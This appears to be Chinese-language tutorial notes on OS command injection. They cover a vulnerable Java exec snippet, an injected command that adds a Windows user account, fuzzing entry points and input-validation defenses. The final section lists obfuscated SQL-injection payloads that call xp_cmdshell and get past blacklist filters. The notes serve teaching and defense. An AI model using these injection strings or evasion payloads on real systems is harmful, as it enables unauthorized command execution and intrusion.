# OS命令注入攻击


* 方法论:
	- 识别数据入口点
	- 注入数据(有效载荷)
	- 检测到异常响应.
	- 自动化



* 例如片段:

```
String cmd = new String("cmd.exe /K processReports.bat clientId=" + input.getValue("ClientId"));
Process proc = Runtime.getRuntime().exec(cmd);
```

当客户机响应**444**,我们会有以下字符串:

```
cmd.exe /K processReports.bat clientId=444
```

但是, 攻击者可以使用客户机id等于运行 **444 && net user hacked hackerd/add**. 如果这样, 我们有以下字符串:

```
cmd.exe /K processReports.bat clientId=444 && net user hacked hacked /add
```

## 注入有效载荷的例子:

* 控制字符字符串和普通攻击:
	- '-- SQL injection
	- && | OS Command Injection
	- <> XSS

* 长字符串(AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)

* 二进制或Null数据


## 模糊测试Web应用程序

* 关注相关的web应用程序的攻击表面.
* 典型的HTTP请求参数:
	- QueryString查询字符串
	- POST dataPOST数据
	- Cookies
	- 其他HTTP标头(用户代理, Referer)

* 其他入口点请求结构:
	- XML web services XML Web服务
	- WCF, GWT, AMF
	- 远程方法调用 (RMI)

* 解决注入缺陷:
	- 全面的、一致的服务器端输入验证
	- 用户安全命令APIs
	- 避免将连接字符串传递给译员
	- 使用强大的数据类型的字符串

### 输入验证白名单
- 输入已知良好的值进行验证.

- 准确匹配:
		* 定义一个特定的确切值列表
		* 有大量的预计值时显得困难
- 模式匹配:
		* 已知值与良好的输入模式匹配.
		* 数据类型,正则表达式, 等等.

### 输入验证黑名单

- 输入验证已知的差值.
- 不像白名单验证有效一样.
		* 通过编码容易绕过
		* 全球保护,因此往往不知道上下文.
- 不断变化的动态应用程序的攻击.

#### 逃避黑名单过滤器

利用载荷:

```
';exec xp_cmdshell 'dir';--
```

```
‘;Declare @cmd as varchar(3000);Set @cmd =
 ‘x’+'p’+'_’+'c’+'m’+'d’+’s’+'h’+'e’+'l’+'l’+'/**/’+””+’d’+’i'+’r’+””;exec(@cmd);--
```
```
‘;ex/**/ec xp_cmds/**/hell ‘dir’;--
```

```
Declare @cmd as varchar(3000);Set @cmd
=(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+CHAR(109)+CHAR(97)+CHAR(115)+CHA
R(116)+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+
CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CH
AR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));EXEC(@cmd);--
```

```
‘;Declare @cmd as varchar(3000);Set @cmd =
 convert(varchar(0),0×78705F636D647368656C6C202764697227);exec(@cmd);--
```
